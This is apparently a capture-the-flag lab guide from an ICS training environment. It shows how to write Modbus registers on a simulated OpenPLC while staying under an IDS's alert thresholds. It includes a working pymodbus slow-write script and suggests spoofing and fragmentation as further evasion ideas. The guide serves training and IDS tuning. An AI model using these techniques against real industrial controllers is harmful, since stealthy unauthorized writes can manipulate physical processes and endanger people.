# 🥷 IDS Evasion Challenge

> **MITRE ATT&CK for ICS:** `Evasion` | [T0820 - Exploitation for Evasion](https://attack.mitre.org/techniques/T0820/) | [T0855 - Unauthorized Command Message](https://attack.mitre.org/techniques/T0855/)

## 📋 Overview

Real-world attackers study intrusion detection systems to understand their detection logic and thresholds. By operating below these thresholds ("low-and-slow" attacks), they can manipulate industrial processes without triggering alerts.

This challenge simulates that scenario: you must write to Modbus registers on the PLC while staying invisible to the CybICS IDS. Understanding the detection rules and their exact thresholds is the key to success.

## 📦 Prerequisites

- The IDS must be running (check the IDS dashboard at http://localhost:8443)
- Access to the attack machine (http://localhost:6081/vnc.html) or webshell
- Python with `pymodbus` library (`pip install pymodbus`)

## 🎯 Task

Perform a stealth Modbus write operation against the OpenPLC controller without triggering any IDS alerts.

### 📝 Step 1: Study the Detection Rules

Before attempting evasion, study the IDS rules on the **Rules tab** of the dashboard. The relevant rules are:

| Rule | Threshold | What Triggers It |
|---|---|---|
| `modbus_unauth_write` | **10 writes in 30 seconds** | Modbus write function codes from non-service hosts |
| `modbus_flood` | **50 writes in 5 seconds** | High-rate Modbus writes from non-service hosts |
| `port_scan` | **5 ports in 10 seconds** | SYN packets to multiple destination ports |
| `syn_flood` | **100 SYNs in 10 seconds** | Excessive SYN packets from single source |

**Key Insight:** The `modbus_unauth_write` rule triggers when **10 or more** write operations are detected from a non-service IP within a 30-second sliding window. If you send **fewer than 10 writes within any 30-second period**, this rule will not fire.

### 📝 Step 2: Start the Evasion Window

Start a 2-minute evasion challenge via the API or the Challenges tab:

```bash
curl -X POST http://localhost:8443/api/evasion/start
```

This records the current alert count and begins monitoring for your stealth Modbus writes.

### 📝 Step 3: Send Stealth Modbus Writes

From the attack machine, send **at least 3** Modbus write commands to OpenPLC, staying below the detection thresholds.

#### Slow Write Script (Python)

```python
from pymodbus.client import ModbusTcpClient
import time

client = ModbusTcpClient('172.18.0.3', port=502)
client.connect()

# Send 3 writes with delays to stay under threshold
# Threshold: 10 writes / 30 seconds
# Strategy: send writes slowly (well under the limit)
for i in range(3):
    result = client.write_register(1124, 100 + i)
    print(f"Write {i+1}: {'OK' if not result.isError() else 'ERROR'}")
    if i < 2:
        time.sleep(5)  # 5 second delay between writes

client.close()
print("Stealth writes complete!")
```

#### Alternative: Single Write Commands

```bash
# Using Python one-liners, send individual writes:
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('172.18.0.3', port=502)
c.connect()
c.write_register(1124, 42)
c.close()
print('Write 1 done')
"
# Wait a few seconds...
# Repeat 2 more times
```

### 📝 Step 4: Verify Success

Check the evasion challenge status:

```bash
curl http://localhost:8443/api/evasion/check
```

**Success criteria:**
- `modbus_writes_detected` >= 3 (your writes were seen by the IDS)
- `new_alerts` == 0 (but none triggered an alert)
- `success` == true

If successful, the flag will be included in the response.

### ⚠️ Common Mistakes

1. **Too many writes too fast**: Sending 10+ writes within 30 seconds triggers `modbus_unauth_write`
2. **Port scanning first**: If you nmap the target during the evasion window, `port_scan` fires
3. **Connecting to multiple ports**: Stick to port 502 only
4. **Running flooding scripts**: Scripts like `flooding_hpt.py` send writes in tight loops, triggering `modbus_flood`

<details>
<summary>💡 Hint</summary>

The key threshold is `modbus_unauth_write`: 10 writes in 30 seconds. Send only 3 writes with 5-second delays between them — this keeps you well under the limit. Use a single TCP connection to port 502 only, and don't run any scans during the evasion window.

</details>

## 🛡️ Security Framework References

<details>
  <summary>Click to expand</summary>

### MITRE ATT&CK for ICS — Techniques Applied

| Tactic | Technique | ID | Description |
|--------|-----------|-----|-------------|
| Lateral Movement | Exploitation of Remote Services | [T0866](https://attack.mitre.org/techniques/T0866/) | Accessing PLC via Modbus protocol |
| Impair Process Control | Unauthorized Command Message | [T0855](https://attack.mitre.org/techniques/T0855/) | Writing to PLC registers |
| Evasion | Exploitation for Evasion | [T0820](https://attack.mitre.org/techniques/T0820/) | Exploiting trusted communication patterns |
| Impair Process Control | Manipulation of Control | [T0831](https://attack.mitre.org/techniques/T0831/) | Modifying PLC register values |

### MITRE D3FEND — Defensive Techniques Tested

| Technique | ID | Description |
|-----------|-----|-------------|
| Network Traffic Analysis | [D3-NTA](https://d3fend.mitre.org/technique/d3f:NetworkTrafficAnalysis/) | Understanding what the IDS can and cannot detect |
| Protocol Metadata Anomaly Detection | [D3-PMAD](https://d3fend.mitre.org/technique/d3f:ProtocolMetadataAnomalyDetection/) | Analyzing protocol-level detection rules |

### NIST SP 800-82r3 Reference

| Control Family | Controls | Relevance |
|----------------|----------|-----------|
| **System and Information Integrity (SI)** | SI-4 | Information system monitoring |
| **Risk Assessment (RA)** | RA-5 | Vulnerability scanning |
| **Assessment, Authorization, and Monitoring (CA)** | CA-8 | Penetration testing |
| **System and Communications Protection (SC)** | SC-7 | Boundary protection |

**Why NIST 800-82r3 matters here:** NIST 800-82r3 Section 6.2.7 acknowledges that monitoring (SI-4) has inherent limitations. Threshold-based detection can be evaded by low-and-slow attacks. CA-8 (Penetration Testing) recommends testing detection capabilities to identify blind spots. Understanding evasion techniques helps defenders tune their IDS rules and implement defense-in-depth strategies where multiple detection layers compensate for individual weaknesses.

</details>

## 🔍 Defensive Thinking

After completing this challenge, consider:
- **Timing analysis**: How does the sliding window work? Can you send 9 writes, wait 31 seconds, then send 9 more?
- **Source spoofing**: Could you spoof your source IP to match a known service? (Hint: the IDS checks source IP against the `KNOWN_SERVICES` list)
- **Protocol-level evasion**: Are there Modbus function codes the IDS doesn't monitor?
- **Fragmentation**: Would IP fragmentation bypass the payload inspection?
- How would you improve detection to catch low-and-slow attacks?
- What role does behavioral baselining play in detecting evasion?
